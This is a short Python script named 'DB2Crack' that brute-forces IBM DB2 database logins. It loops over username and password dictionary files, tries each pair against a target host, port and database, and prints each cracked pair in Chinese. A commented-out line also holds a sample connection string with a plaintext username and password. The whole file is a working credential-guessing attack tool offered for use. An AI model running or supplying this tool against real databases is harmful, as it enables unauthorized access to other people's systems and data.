#python3 db2.py -t 192.168.201.1 -p 50000 -d testdb -u user.txt -P pass.txt
import ibm_db
import optparse
import threading
#conn = ibm_db.connect("database=testdb;hostname=192.168.201.1;port=50000;protocol=tcpip;uid=db2inst1;pwd=GGtest11;","","")
def Blast(ip,port,db,user_dics, pwd_dics):#爆破
    success = False
    users_f = open(user_dics, 'r')
    pwds_f = open(pwd_dics, 'r')
    for user in users_f.readlines():
        pwds_f.seek(0)
        for password in pwds_f.readlines():
            username = user.strip('\n').strip('\r')
            password = password.strip('\n').strip('\r')
            try:
                success = ibm_db.connect("database=%s;hostname=%s;port=%s;protocol=tcpip;uid=%s;pwd=%s;"%(db,ip,port,username,password),"","")
                if success:
                    print("\033[1;35;46m 用户名:" + username + " 密码:" + password + " 破解成功 \033[0m")
            except Exception as  e:
                #print(e)
                print("用户名:" + username + " 密码:" + password + " 破解失败")
                pass
def main():
    print("Welcome to DB2Crack")
    print("Version:1.0")
    parser = optparse.OptionParser('usage%prog -t <ip> -p <port> -d <dbname> -u <users dictionary> -P <password dictionary>')
    parser.add_option('-u', dest='user_dic', type='string', help='specify the dictionary for user')
    parser.add_option('-P', dest='pwd_dic', type='string', help='specify the dictionary for passwords')
    parser.add_option('-t', dest='ip', type='string', help='Target')
    parser.add_option('-p', dest='port', type='string', help='Port')
    parser.add_option('-d', dest='db', type='string', help='DBName')
    (options, args) = parser.parse_args()
    user_dic = options.user_dic
    pwd_dic = options.pwd_dic
    ip = options.ip
    port = options.port
    db = options.db
    #brute_force(user_dic, pwd_dic)
    t = threading.Thread(target=Blast, args=(ip,port,db,user_dic, pwd_dic))
    t.start()

if __name__ == '__main__':
    main()